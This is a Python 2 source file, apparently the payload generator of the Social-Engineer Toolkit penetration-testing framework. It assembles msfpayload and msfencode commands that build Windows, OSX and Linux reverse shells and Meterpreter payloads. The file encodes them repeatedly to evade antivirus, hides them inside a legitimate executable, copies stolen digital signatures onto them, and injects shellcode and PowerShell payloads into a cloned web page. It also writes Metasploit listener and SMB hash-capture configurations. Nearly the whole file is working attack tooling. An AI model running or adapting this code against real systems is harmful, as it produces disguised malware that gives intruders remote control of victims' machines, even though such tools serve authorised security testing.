#!/usr/bin/env python
## Import modules
import subprocess
import time
import sys
import os
import re
import socket
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *

me = mod_name()
listener="notdefined"
definepath=os.getcwd()
sys.path.append(definepath)
port1 = "8080"
port2 = "8081"
operating_system = check_os()

# grab configuration options
encount="4"

configfile=file("%s/config/set_config" % (definepath),"r").readlines()

auto_migrate="OFF"

msf_path = meta_path()

for line in configfile:
    line=line.rstrip()
    match1=re.search("ENCOUNT=", line)
    if match1:
        line=line.replace("ENCOUNT=", "")
        encount=line

    match2=re.search("AUTO_MIGRATE=", line)
    if match2:
        line=line.replace("AUTO_MIGRATE=", "")
        auto_migrate=line

    match3=re.search("DIGITAL_SIGNATURE_STEAL=", line)
    if match3:
        digital_steal=line.replace("DIGITAL_SIGNATURE_STEAL=", "")

    match4=re.search("METERPRETER_MULTI_SCRIPT=", line)
    if match4:
        meterpreter_multi=line.replace("METERPRETER_MULTI_SCRIPT=", "")

    match5=re.search("LINUX_METERPRETER_MULTI_SCRIPT=", line)
    if match5:
        linux_meterpreter_multi=line.replace("LINUX_METERPRETER_MULTI_SCRIPT=", "")

    match6=re.search("METERPRETER_MULTI_COMMANDS=", line)
    if match6:
        meterpreter_multi_command=line.replace("METERPRETER_MULTI_COMMANDS=", "")
        meterpreter_multi_command=meterpreter_multi_command.replace(";", "\n")

    match7=re.search("LINUX_METERPRETER_MULTI_COMMANDS=", line)
    if match7:
        linux_meterpreter_multi_command=line.replace("LINUX_METERPRETER_MULTI_COMMANDS=", "")
        linux_meterpreter_multi_command=linux_meterpreter_multi_command.replace(";", "\n")

    # define if we use upx encoding or not
    match8=re.search("UPX_ENCODE=", line)
    if match8:
        upx_encode=line.replace("UPX_ENCODE=", "")

    # set the upx flag
    match9=re.search("UPX_PATH=", line)
    if match9:
        upx_path=line.replace("UPX_PATH=", "")
        if upx_encode == "ON":
            if not os.path.isfile(upx_path):
                if operating_system != "windows":
                    print_error("ERROR:UPX packer not found in the pathname specified in config. Disabling UPX packing for executable!")
                upx_encode == "OFF"

    # set the unc embed flag
    match10=re.search("UNC_EMBED=", line)
    if match10:
        unc_embed=line.replace("UNC_EMBED=", "")

# add the digital signature stealing
if digital_steal == "ON":
    try:
        debug_msg(me,"importing Python module 'pefile'",1)
        try: reload(pefile)
        except: import pefile
        sys.path.append("src/core/digitalsig/")
        debug_msg(me,"importing 'src.core.digitalsig.disitool'",1)
        try: reload(disitool)
        except: import disitool

    except ImportError:
        if operating_system != "windows":
            print_error("Error:PEFile not detected. You must download it from http://code.google.com/p/pefile/")
            print_warning("Turning the digital signature stealing flag off... A/V Detection rates may be lower.")
        digital_steal = "OFF"

attack_vector=0
linosx=0
multiattack=""
# grab attack vector
if os.path.isfile("src/program_junk/attack_vector"):
    fileopen=file("src/program_junk/attack_vector", "r")
    for line in fileopen:
        line=line.rstrip()
        if line == "java":
            attack_vector="java"
        if line == "multiattack":
            attack_vector="multiattack"
            multiattack=file("src/program_junk/multi_payload","w")

# here is a place holder for the multi attack java
# multiattack outputs a file called multi_java if
# this file is present it will allow additional
# functionality
multiattack_java="off"
if os.path.isfile("src/program_junk/multi_java"):
    multiattack_java="on"

# grab binary path if needed
fileopen=file("config/set_config", "r")
for line in fileopen:
    match=re.search("CUSTOM_EXE=", line)
    if match:
        line=line.rstrip()
        line=line.replace("CUSTOM_EXE=", "")
        custom_exe=line
        if custom_exe == "legit.binary": custom_exe="src/payloads/exe/legit.binary"

# custom payloadgen
payloadgen="regular"
if os.path.isfile("src/program_junk/payloadgen"):
    payloadgen="solo"

# set ipquestion to blank until otherwise pulled
ipquestion=""

####################################################################################################################################
# grab ipaddr if it hasn't been identified yet
####################################################################################################################################

if not os.path.isfile("src/program_junk/ipaddr.file"):
    filewrite=file("src/program_junk/ipaddr.file","w")
    fileopen=file("config/set_config", "r").readlines()
    for line in fileopen:
        line=line.rstrip()
        match=re.search("AUTO_DETECT=ON", line)
        if match:
            try:
                ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                ipaddr.connect(('google.com', 0))
                ipaddr.settimeout(2)
                ipaddr=ipaddr.getsockname()[0]
                filewrite.write(ipaddr)
                filewrite.close()
            except Exception,e:
                log(e)
                ipaddr=raw_input(setprompt(["4"], "IP address for the payload listener"))
                filewrite.write(ipaddr)
                filewrite.close()

    # if AUTO_DETECT=OFF prompt for IP Address
    for line in fileopen:
        line=line.rstrip()
        match=re.search("AUTO_DETECT=OFF", line)
        if match:
            ipaddr=raw_input(setprompt(["4"], "Enter the IP address for the payload (reverse)"))
            filewrite.write(ipaddr)
            filewrite.close()

# payload selection here
try:

    # Specify path to metasploit
    path=msf_path
    # Specify payload

    # this is encoding
    encode=""
    # this is payload
    choice1=""
    # this is port 
    choice3=""
    if os.path.isfile("src/program_junk/meterpreter_reverse_tcp_exe"):
        fileopen=file("src/program_junk/meterpreter_reverse_tcp_exe", "r")
        for line in fileopen:
            # this reads in the first line of the file which happens to be port
            # when calling through core
            choice3=line.rstrip()
            # change attack_vector to nothing
            attack_vector=""

        # specify payload
        choice1="windows/meterpreter/reverse_tcp"
        # encode using backdoored executable
        encode="16"

    # if we don't trigger on the standard core api call
    if choice1 == "":
        ###################################################
        #        USER INPUT: SHOW PAYLOAD MENU 1          #
        ###################################################
        debug_msg(me,"printing 'text.payload_menu_1'",5)
        show_payload_menu1 = create_menu(payload_menu_1_text, payload_menu_1)          
        choice1 = raw_input(setprompt(["4"], ""))

    if operating_system == "windows" or msf_path == False:
        # default blank then select SETSHELL
        if choice1 == "":
            choice1 = "11"
        # if we specify choice 1, thats SETSHELL
        if choice1 == "1":
            choice1 == "11"
        # if we specify choice 2, thats the SET reverse http shell
        if choice1 == "2":
            choice1 = "12"
        # selecting ratte
        if choice1 == "3":
            choice1 = "13"

        # if they specified something else that wasn't there just default to SETSHELL
        else: choice1 = "11"
    # check the length and make sure it works
    if choice1 != "":
        choice1 = check_length(choice1,15)
        # convert it to a string
        choice1 = str(choice1)   
    custom=0
    counter=0
    flag=0
    encode_stop=0

    # Condition testing of 'choice1'
    # Will use a dictionary list 
    
    if choice1 == "exit": 
        exit_set()

    if choice1 == '':
        choice1 = ("11")

    if choice1 == '5' or choice1 == '6' or choice1 == '7':
        encode_stop = 1
        encode = ""

    if choice1 == '8':
        flag = 1

    # here we specify shellcodeexec
    if choice1 == '14':
        encode_stop = 1
        encode = 0

    # 11 is the set interactive shell, 12 is set rev http shell and 13 is ratte listener
    if choice1 == '11' or choice1 == '12' or choice1 == "13":
        encoder = 'false'
        payloadgen = 'solo'
        encode_stop = 1
        filewrite = file("%s/src/program_junk/set.payload" % (definepath), "w")
        # select setshell
        if choice1 == '11':
            filewrite.write("SETSHELL")
        # select setshell_reverse
        if choice1 == '12':
            filewrite.write("SETSHELL_HTTP")
        # select ratte
        if choice1 == '13':
            filewrite.write("RATTE")
        filewrite.close()

    # if we are importing our own custom exe
    if choice1 != "15":
        # if not then import the payload selection
        choice1 = ms_payload_2(choice1)

    # don't do courtesy shell
    if counter==0:
        courtesyshell=("")

    # if custom
    if choice1=='15':
        print_info("Example: /root/custom.exe")
        choice1=raw_input(setprompt(["4"], "Enter the path to your executable"))
        if not os.path.isfile(choice1):
            print_error("ERROR:File not found. Exiting.")
            exit_set()
        update_options("CUSTOM_EXE=%s" % (choice1))
        custom=1

    # if we are using our own executable
    if custom == 1:
        check_write=file("src/program_junk/custom.exe", "w")
        check_write.write("VALID")
        check_write.close()
        shutil.copyfile("%s" % (choice1), "msf.exe") #subprocess.Popen("cp %s msf.exe;cp msf.exe %s/src/html/msf.exe" % (choice1,definepath), shell=True).wait()
        shutil.copyfile("msf.exe", "%s/src/html/msf.exe" % (definepath))

    # Specify Encoding Option
    encoder="false"

    # if we aren't using the set shell
    if choice1 != "set/reverse_shell":
        # we need to rewrite index.html real quick because it has a parameter that could get confusing
        if os.path.isfile("%s/src/program_junk/web_clone/index.html" % (definepath)):
            fileopen = file("%s/src/program_junk/web_clone/index.html" % (definepath),"r")
            data = fileopen.read()
            data = data.replace("freehugs", "")
            os.remove("%s/src/program_junk/web_clone/index.html" % (definepath))
            filewrite=file("%s/src/program_junk/web_clone/index.html" % (definepath), "w")
            filewrite.write(data)
            filewrite.close()



    if custom == 0:
        if encode_stop == 0 and encode != "16" and choice1 != "set/reverse_shell":
            ###################################################
            #        USER INPUT: SHOW ENCODER MENU            #
            ###################################################   
            debug_msg (me,"printing 'text.encoder_menu'",5)
            show_encoder_menu = create_menu(encoder_text, encoder_menu)      
            encode = raw_input(setprompt(["18"], ""))

            encoder="true"

            if encode == 'exit':
                exit_set()

            # turn off some options if fasttrack is in use
            if os.path.isfile("src/program_junk/fasttrack.options"):
                upx_encode == "OFF"
                encode = "2"
                encoder = "true"

            # Handle special cases 
            if encode=='' or encode == ' ': encode = '16'
            if encode == '16': encount=0
            if encode=='14' or encode == '0': encoder="false"

            # do dictionary lookup            
            encode1 = encoder_type(encode)
            encode = "x86/" + encode1
            if encode == "x86/MULTIENCODE" or encode == "x86/BACKDOOR":
                encode = encode.replace("x86/", "")

        # Specify Remote Host if ipaddr.file is missing (should never get here)
        if not os.path.isfile("src/program_junk/ipaddr.file"):
            choice2=raw_input(setprompt(["4"], "IP Address of the listener/attacker (reverse) or host/victim (bind shell)"))
            filewrite=file("src/program_junk/ipaddr.file","w")
            filewrite.write(choice2)
            filewrite.close()
        fileopen=file("src/program_junk/ipaddr.file" , "r").readlines()
        for line in fileopen:
            line=line.rstrip()
            choice2=line

        # grab interface ip address
        if os.path.isfile("src/program_junk/interface"):
            fileopen=file("src/program_junk/interface", "r").readlines()
            for line in fileopen:
                line=line.rstrip()
                ipquestion=line

        # specify the port for the listener
        if choice3 == "":
            choice3=raw_input(setprompt(["4"], "PORT of the listener [443]"))
        if choice3 == '': choice3 = '443'
        # this is needed for the set_payload
        filewrite = file ("%s/src/program_junk/port.options" % (definepath), "w")
        filewrite.write(choice3)
        filewrite.close()

        # if we are using the SET interactive shell then do this
        if choice1 == "set/reverse_shell":
            encoder = "false"
            filewrite=file("%s/src/program_junk/set.payload.posix" % (definepath), "w")
            filewrite.write("true")
            filewrite.close()
            import src.core.payloadprep

        # if were using the multiattack option
        if attack_vector == "multiattack":
            multiattack.write("MAIN="+str(choice3)+"\n")
            multiattack.write("MAINPAYLOAD="+str(choice1)+"\n")

        # if encoding is required, it will place 1msf.exe first then encode it to msf.exe
        if encoder == "true":
            choice4=("R")
            msf_filename=("1msf.exe")
        if encoder == "false":
            choice4=("X")
            msf_filename=("msf.exe")

        # set choice to blank for ALL PORTS scan
        if flag == 0:
            portnum="LPORT="+choice3
        if flag == 1:
            portnum=""

        if encode != "BACKDOOR":
            # if we aren't using the set reverse shell
            if choice1 != "set/reverse_shell":
                # if we aren't using shellcodeexec
                if choice1 != "shellcode/alphanum":
                    generatepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s > %s/src/html/%s" % (path,choice1,choice2,portnum,courtesyshell,choice4,definepath,msf_filename), shell=True).wait()    
                # if we are using shellcodeexec
                if choice1 == "shellcode/alphanum":
                    #choice1 = "windows/meterpreter/reverse_tcp"
                    print ("\nSelect the payload you want to deliver via shellcodeexec\n\n   1) Windows Meterpreter Reverse TCP\n   2) Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager\n   3) Windows Meterpreter (Reflective Injection) Reverse HTTP Stager\n")
                    # select payload
                    choice1 = raw_input(setprompt(["4"], "Enter the number for the payload [meterpreter_reverse_tcp]"))
                    # select default meterpreter reverse tcp
                    if choice1 == "" or choice1 == "1": choice1 = "windows/meterpreter/reverse_tcp"
                    # select reverse https
                    if choice1 == "2": choice1 = "windows/meterpreter/reverse_https"
                    # select reverse http
                    if choice1 == "3": choice1 = "windows/meterpreter/reverse_http"
                    print_status("Generating the payload via msfpayload and generating alphanumeric shellcode...")
                    subprocess.Popen("ruby %s/msfpayload %s LHOST=%s %s EXITFUNC=thread R > %s/src/program_junk/meterpreter.raw" % (path,choice1,choice2,portnum,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                    subprocess.Popen("ruby %s/msfencode -e x86/alpha_mixed -i %s/src/program_junk/meterpreter.raw -t raw BufferRegister=EAX > %s/src/program_junk/meterpreter.alpha" % (path,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                    print_status("Prepping shellcodeexec for delivery..")

                    # here we obfuscate the binary a little bit
                    random_string = generate_random_string(3,3).upper()
                    fileopen = file("%s/src/payloads/exe/shellcodeexec.binary" % (definepath), "rb")
                    filewrite = file("%s/src/program_junk/shellcodeexec.custom" % (definepath), "wb")
                    data = fileopen.read()
                    filewrite.write(data.replace("UPX", random_string, 4))
                    filewrite.close()
                    subprocess.Popen("cp %s/src/program_junk/shellcodeexec.custom %s/src/html/msf.exe 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()
                    # we need to read in the old index.html file because its already generated, need to present the alphanum to it
                    if os.path.isfile("%s/src/program_junk/web_clone/index.html" % (definepath)):
                        fileopen = file("%s/src/program_junk/web_clone/index.html" % (definepath), "r")
                        filewrite = file("%s/src/program_junk/web_clone/index.html.new" % (definepath), "w")
                        fileopen2 = file("%s/src/program_junk/meterpreter.alpha" % (definepath), "r")
                        alpha_shellcode = fileopen2.read().rstrip()
                        data = fileopen.read()
                        data = data.replace('param name="ILIKESTUFF" value=""', 'param name="ILIKESTUFF" value="%s"' % (alpha_shellcode))
                        filewrite.write(data)
                        # close file
                        filewrite.close()
                        # rename file
                        print_status("Prepping website for alphanumeric injection..")
                        subprocess.Popen("mv %s/src/program_junk/web_clone/index.html.new %s/src/program_junk/web_clone/index.html 1> /dev/null 2> /dev/null" % (definepath,definepath), shell=True).wait()

        # write out the payload for powershell injection to pick it up if used
        filewrite = file("src/program_junk/metasploit.payload", "w")
        filewrite.write(choice1)
        filewrite.close()
        # import if on
        setshell_counter = 0
        powershell = check_config("POWERSHELL_INJECTION=")
        if powershell.lower() == "on" or powershell.lower() == "yes":
            if choice1 == "set/reverse_shell" or choice1 == "RATTE":
                print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
                setshell_counter = 1
            if setshell_counter == 0:
                if os.path.isfile("src/program_junk/web_clone/index.html"):
                    import src.payloads.powershell.prep
                    if os.path.isfile("src/program_junk/x64.powershell"):
                        fileopen1 = file("src/program_junk/x64.powershell", "r")
                        x64 = fileopen1.read()
                        # open up the x86 powershell attack
                        fileopen2 =file("src/program_junk/x86.powershell", "r")
                        x86 = fileopen2.read()
                        # open up the original file and replace stuff
                        fileopen3 = fileopen = file("src/program_junk/web_clone/index.html", "r")
                        filewrite = file("src/program_junk/web_clone/index.html.new", "w")
                        data = fileopen3.read()
                        data = data.replace('param name="X64" value=""', 'param name="X64" value="%s"' % (x64))
                        data = data.replace('param name="X86" value=""', 'param name="X86" value="%s"' % (x86))
                        # check if we don't want to deploy binaries
                        deploy_binaries = check_config("DEPLOY_BINARIES=")
                        if deploy_binaries.lower() == "n" or deploy_binaries.lower() == "no":
				data = data.replace('param name="LAUNCH" value="YES"', 'param name="LAUNCH" value="NO"')
                        filewrite.write(data)
                        filewrite.close()
                        subprocess.Popen("mv src/program_junk/web_clone/index.html.new src/program_junk/web_clone/index.html", stdout=subprocess.PIPE, shell=True)
				


        if encoder ==  "true":
            # If not option 15 or default then go here
            if encode != "MULTIENCODE":
                if encode != "BACKDOOR":
                    print_info("Encoding the payload %s times to get around pesky Anti-Virus. [-]\n" % (str(encount)))
                    encodepayload=subprocess.Popen(r"ruby %s/msfencode < %s/src/html/1msf.exe -e %s -o %s/src/html/msf.exe -t exe -c %s" % (path,definepath,encode,definepath,encount), shell=True).wait()
                    subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
 
            # If option 15 or default then go here
            if encode == "MULTIENCODE":
                print_info("Encoding the payload multiple times to get around pesky Anti-Virus.")
                encodepayload=subprocess.Popen(r"ruby %s/msfencode -e x86/shikata_ga_nai -i %s/src/html/1msf.exe -t raw -c 5 | ruby %s/msfencode -t raw -e x86/alpha_upper -c 2 | ruby %s/msfencode -t raw -e x86/shikata_ga_nai -c 5 | ruby %s/msfencode -t exe -c 5 -e x86/countdown -o %s/src/html/msf.exe" % (path,definepath,path,path,path,definepath), shell=True).wait()
                subprocess.Popen("cp src/html/msf.exe src/program_junk/ 1> /dev/null 2> /dev/null", shell=True).wait()
                encode1=("x86/countdown")

            # If option 15, backdoor executable better AV avoidance
            if encode == "BACKDOOR":
                print_info("Backdooring a legit executable to bypass Anti-Virus. Wait a few seconds...")
                backdoor_execution = check_config("BACKDOOR_EXECUTION=").lower()
                if backdoor_execution == "on": backdoor_execution = "-k"
                if backdoor_execution != "on": backdoor_execution = ""
                subprocess.Popen("cp %s src/program_junk/legit.exe 1> /dev/null 2> /dev/null" % (custom_exe), shell=True).wait()
                encodepayload=subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s %s %s %s | ruby %s/msfencode  -c 10 -e x86/shikata_ga_nai -x src/program_junk/legit.exe -o %s/src/html/msf.exe -t exe %s 1> /dev/null 2>/dev/null" % (path,choice1,choice2,portnum,courtesyshell,choice4,path,definepath,backdoor_execution), shell=True).wait()
                print_status("Backdoor completed successfully. Payload is now hidden within a legit executable.")


                # define to use UPX or not
                if upx_encode == "ON":
                    if choice1 != "set/reverse_shell":
                        print_status("UPX Encoding is set to ON, attempting to pack the executable with UPX encoding.")
                        upx("src/html/msf.exe")

                # define to use digital signature stealing or not
                if digital_steal == "ON":
                    print_status("Digital Signature Stealing is ON, hijacking a legit digital certificate") 
                    disitool.CopyDigitalSignature("src/core/digitalsig/digital.signature", "src/html/msf.exe", "src/program_junk/msf2.exe")
                    subprocess.Popen("cp src/program_junk/msf2.exe src/html/msf.exe 1> /dev/null 2> /dev/null", shell=True).wait()
                    subprocess.Popen("cp src/program_junk/msf2.exe src/program_junk/msf.exe", shell=True).wait()
                encode1=("x86/shikata_ga_nai")

        if choice1 == 'windows/shell_bind_tcp' or choice1 == 'windows/x64/shell_bind_tcp' :
            print_info("When the payload is downloaded, you will want to connect to the victim directly.")

        # specify attack vector as SET interactive shell
        if choice1 == "set/reverse_shell": attack_vector = "set_payload"

        # if we have the java attack, multiattack java, and the set interactive shell
        if attack_vector == "java" or multiattack_java == "on":
            if attack_vector != "set_payload":                
                # pull in the ports from config
                port1=check_config("OSX_REVERSE_PORT=")
		# if we are using the multiattack, there will be port conflicts, need to scoot it to 8082
		if attack_vector == "multiattack":
			port1 = "8082"
                port2=check_config("LINUX_REVERSE_PORT=")
                print_status("Generating OSX payloads through Metasploit...")
                subprocess.Popen(r"ruby %s/msfpayload osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/mac.bin;chmod 755 %s/src/html/mac.bin" % (path,choice2,port1,definepath,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                print_status("Generating Linux payloads through Metasploit...")
                subprocess.Popen(r"ruby %s/msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/src/html/nix.bin" % (path,choice2,port2,definepath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                if multiattack_java == "on":
                    multiattack.write("OSX="+str(port1)+"\n")
                    multiattack.write("OSXPAYLOAD=osx/x86/shell_reverse_tcp\n")
                    multiattack.write("LINUX="+str(port2)+"\n")
                    multiattack.write("LINUXPAYLOAD=linux/x86/shell/reverse_tcp\n")
        # try block here
        try:
            # if they want a listener, start here
            filewrite=file("src/program_junk/meta_config", "w")

            # if there isn't a multiattack metasploit, setup handler
            if not os.path.isfile("src/program_junk/multi_meta"):

                filewrite.write("use exploit/multi/handler\n")
                filewrite.write("set PAYLOAD "+choice1+"\n")
                filewrite.write("set LHOST 0.0.0.0" + "\n")
                if flag == 0:
                    filewrite.write("set LPORT "+choice3+"\n")

                filewrite.write("set ExitOnSession false\n")
                if auto_migrate == "ON":
                        filewrite.write("set AutoRunScript migrate -f\n")

                # config option for using multiscript meterpreter
                if meterpreter_multi == "ON":
                    multiwrite=file("src/program_junk/multi_meter.file", "w")
                    multiwrite.write(meterpreter_multi_command)        
                    filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/multi_meter.file\n" % (definepath))
                    multiwrite.close()
                filewrite.write("exploit -j\n\n")

                # if we want to embed UNC paths for hashes
                if unc_embed == "ON":
                    filewrite.write("use server/capture/smb\n")
                    filewrite.write("exploit -j\n\n")        

                # if only doing payloadgen then close the stuff up
                if payloadgen == "solo": filewrite.close()

            # Define linux and OSX payloads
            if payloadgen == "regular":
                filewrite.write("use exploit/multi/handler\n")
                filewrite.write("set PAYLOAD osx/x86/shell_reverse_tcp" +"\n")
                filewrite.write("set LHOST "+choice2+"\n")
                filewrite.write("set LPORT "+port1+"\n")
                filewrite.write("set InitialAutoRunScript post/osx/gather/enum_osx" +"\n")
                filewrite.write("set ExitOnSession false\n")
                filewrite.write("exploit -j\n\n")
                filewrite.write("use exploit/multi/handler\n")
                filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
                filewrite.write("set LHOST "+choice2+"\n")
                filewrite.write("set LPORT "+port2+"\n")
                if linux_meterpreter_multi == "ON":
                    multiwrite=file("src/program_junk/lin_multi_meter.file", "w")
                    multiwrite.write(linux_meterpreter_multi_command)        
                    filewrite.write("set InitialAutorunScript multiscript -rc %s/src/program_junk/lin_multi_meter.file\n" % (definepath))
                    multiwrite.close()
                filewrite.write("set ExitOnSession false\n")
                filewrite.write("exploit -j\n\n")                
                filewrite.close()


        except Exception, e:
            log(e)
            print_error("ERROR:Something went wrong:")
            print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# Catch all errors
except KeyboardInterrupt: 
        print_warning("Keyboard Interrupt Detected, exiting Payload Gen")

# finish closing up the remenant files
if attack_vector == "multiattack":
    multiattack.close()
if os.path.isfile("%s/src/program_junk/fileformat.file" % (definepath)):
    filewrite=file("%s/src/program_junk/payload.options" % (definepath), "w")
    filewrite.write(choice1+" 0.0.0.0 " + choice3)
    filewrite.close()

if choice1 == "set/reverse_shell":
        if os.path.isfile("src/program_junk/meta_config"): os.remove("src/program_junk/meta_config")
